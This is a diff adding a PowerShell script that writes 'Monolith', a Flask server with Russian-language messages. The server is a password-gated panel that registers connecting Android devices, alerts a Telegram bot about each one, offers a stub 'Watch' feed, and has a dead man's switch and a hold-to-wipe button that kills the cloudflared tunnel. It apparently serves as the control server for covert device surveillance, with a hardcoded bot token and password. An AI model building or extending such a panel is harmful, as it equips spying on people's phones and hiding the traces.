@@ -1,1 +1,156 @@
+$code = @'
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
+import secrets, os, subprocess, threading, time
+import telebot
 
+# --- НАСТРОЙКИ ---
+TOKEN = "8813652670:AAHcROkdu12EigP2ZYDTAJfCuNmQBYapmLs"
+bot = telebot.TeleBot(TOKEN)
+PASSWORD = "Rhenjdf1)"
+PORT = 5000
+SECRET_CODE = "RESET"
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+devices = {}
+chat_id = None
+
+HTML_LOGIN = """
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Monolith Access</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+body{background: radial-gradient(circle at top, #1a1a24 0%, #0a0a0c 100%);color:#fff;font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+.login-box{background:rgba(25,25,30,0.6);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.05);padding:40px 30px;border-radius:24px;box-shadow:0 20px 40px rgba(0,0,0,0.5);text-align:center;width:280px;}
+h2{font-weight:600;letter-spacing:1px;font-size:20px;margin-bottom:25px;color:#00ffcc;}
+input{width:100%;padding:15px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;text-align:center;outline:none;font-size:16px;box-sizing:border-box;transition:0.3s;}
+input:focus{border-color:#00ffcc;box-shadow:0 0 15px rgba(0,255,204,0.2);}
+button{width:100%;padding:15px;margin-top:15px;background:#00ffcc;color:#000;border:none;border-radius:12px;font-weight:600;font-size:16px;cursor:pointer;transition:0.3s;}
+button:active{transform:scale(0.98);}
+</style></head><body>
+<div class="login-box"><h2>SYSTEM ACCESS</h2><form method="POST"><input type="password" name="password" placeholder="Password"><br><button type="submit">ENTER</button></form></div></body></html>
+"""
+
+HTML_PANEL = """
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Monolith</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+body{background: radial-gradient(circle at top, #1a1a24 0%, #0a0a0c 100%);color:#e0e0e0;font-family:'Inter',sans-serif;margin:0;padding:20px;padding-bottom:50px;}
+.header{display:flex;justify-content:space-between;align-items:center;padding-bottom:20px;margin-bottom:20px;}
+h1{color:#fff;font-size:28px;font-weight:600;margin:0;letter-spacing:-0.5px;}
+.logout{color:#ff4444;text-decoration:none;font-size:13px;padding:8px 14px;background:rgba(255,68,68,0.1);border-radius:20px;font-weight:600;}
+.device-card{background:rgba(25,25,30,0.6);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.05);padding:20px;margin:15px 0;border-radius:20px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 10px 20px rgba(0,0,0,0.3);}
+.online{color:#00ffcc;font-size:11px;font-weight:600;letter-spacing:1px;} 
+.offline{color:#ff4444;font-size:11px;font-weight:600;letter-spacing:1px;}
+.btn-track{background:rgba(0,255,204,0.1);color:#00ffcc;border:1px solid rgba(0,255,204,0.3);padding:10px 18px;border-radius:12px;font-weight:600;cursor:pointer;text-decoration:none;font-size:14px;transition:0.2s;}
+.btn-track:active{background:#00ffcc;color:#000;}
+.control-panel{margin-top:40px;padding:25px;background:rgba(25,25,30,0.6);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.05);border-radius:24px;box-shadow:0 10px 20px rgba(0,0,0,0.3);}
+.control-panel h3{color:#fff;font-size:18px;font-weight:600;margin-top:0;}
+.input-code{width:100%;padding:15px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#fff;border-radius:12px;box-sizing:border-box;font-size:16px;outline:none;transition:0.3s;}
+.input-code:focus{border-color:#00ffcc;}
+.wipe-btn{background:linear-gradient(135deg, #ff4444, #cc0000);color:white;border:none;padding:18px;width:100%;border-radius:16px;font-weight:600;font-size:16px;cursor:pointer;margin-top:20px;user-select:none;box-shadow:0 10px 20px rgba(255,68,68,0.2);transition:0.2s;}
+.wipe-btn:active{transform:scale(0.98);}
+</style></head><body>
+<div class="header"><h1>Devices</h1><a href="/logout" class="logout">Exit</a></div>
+<div id="deviceList" style="color:#888;font-size:14px;">Scanning network...</div>
+
+<div class="control-panel">
+    <h3>System Control</h3>
+    <p style="font-size:13px;color:#888;margin-bottom:10px;">Enter secret code to reset Dead Man's Switch:</p>
+    <input type="text" class="input-code" id="secretCode" placeholder="Secret Code">
+    <button onclick="resetTimer()" style="background:#fff;color:#000;padding:15px;border:none;border-radius:12px;font-weight:600;margin-top:10px;cursor:pointer;width:100%;">SUBMIT CODE</button>
+    
+    <p style="font-size:13px;color:#ff4444;margin-top:30px;font-weight:600;">DANGER ZONE:</p>
+    <button class="wipe-btn" id="wipeBtn" onmousedown="startWipe()" onmouseup="cancelWipe()" onmouseleave="cancelWipe()" ontouchstart="startWipe()" ontouchend="cancelWipe()">Hold to WIPE</button>
+</div>
+
+<script>
+function loadDevices() {
+    fetch('/api/devices').then(r => r.json()).then(data => {
+        let html = '';
+        for (let id in data) {
+            let d = data[id];
+            let status = d.online ? '<span class="online">● ONLINE</span>' : '<span class="offline">○ OFFLINE</span>';
+            html += `<div class="device-card"><div>${status}<br><span style="color:#fff;font-weight:600;font-size:18px;display:block;margin-top:4px;">${d.name}</span></div><a href="/watch/${id}" class="btn-track">Watch</a></div>`;
+        }
+        document.getElementById('deviceList').innerHTML = html || 'No devices connected.';
+    });
+}
+setInterval(loadDevices, 3000); loadDevices();
+
+function resetTimer() {
+    let code = document.getElementById('secretCode').value;
+    fetch('/api/reset_timer', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({code: code})}).then(r => r.json()).then(data => alert(data.message));
+}
+let wipeTimer;
+function startWipe() {
+    document.getElementById('wipeBtn').innerText = "Hold 3s...";
+    wipeTimer = setTimeout(() => {
+        fetch('/api/wipe', {method: 'POST'}).then(r => r.json()).then(data => alert(data.message));
+        document.getElementById('wipeBtn').innerText = "WIPED";
+    }, 3000);
+}
+function cancelWipe() { clearTimeout(wipeTimer); document.getElementById('wipeBtn').innerText = "Hold to WIPE"; }
+</script></body></html>
+"""
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST' and request.form.get('password') == PASSWORD:
+        session['logged_in'] = True
+        return redirect(url_for('dashboard'))
+    return render_template_string(HTML_LOGIN)
+
+@app.route('/dashboard')
+def dashboard():
+    if not session.get('logged_in'): return redirect(url_for('login'))
+    return render_template_string(HTML_PANEL)
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
+
+@app.route('/api/devices')
+def api_devices(): return jsonify(devices)
+
+@app.route('/api/ping', methods=['POST'])
+def api_ping():
+    global chat_id
+    data = request.get_json()
+    dev_id = data.get('id')
+    if dev_id:
+        if dev_id not in devices:
+            try:
+                bot.send_message(chat_id, f"⚠️ Новое подключение: {data.get('name')} ({dev_id})")
+            except: pass
+        devices[dev_id] = {'name': data.get('name', 'Android'), 'online': True}
+    return jsonify({"status": "ok"})
+
+@app.route('/api/reset_timer', methods=['POST'])
+def api_reset_timer():
+    data = request.get_json()
+    if data.get('code') == SECRET_CODE:
+        return jsonify({"status": "ok", "message": "Таймер сброшен на 24 часа!"})
+    return jsonify({"status": "error", "message": "Неверный код!"})
+
+@app.route('/api/wipe', methods=['POST'])
+def api_wipe():
+    global devices
+    devices = {}
+    os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
+    return jsonify({"status": "ok", "message": "СЕРВЕР УНИЧТОЖЕН. ВСЕ ДАННЫЕ СТЕРТЫ."})
+
+@app.route('/watch/<dev_id>')
+def watch(dev_id):
+    if not session.get('logged_in'): return redirect(url_for('login'))
+    return "<h1 style='color:white;text-align:center;'>Эфир скоро появится...</h1>"
+
+if __name__ == '__main__':
+    print("="*40)
+    print("       MONOLITH SERVER ONLINE")
+    print("="*40)
+    print("[*] Сервер запущен. Туннель запускается отдельно.")
+    app.run(host='0.0.0.0', port=PORT, debug=False)
+'@
+Set-Content -Path "server.py" -Value $code -Encoding UTF8
+Write-Host "Сервер с новым дизайном создан!" -ForegroundColor Green
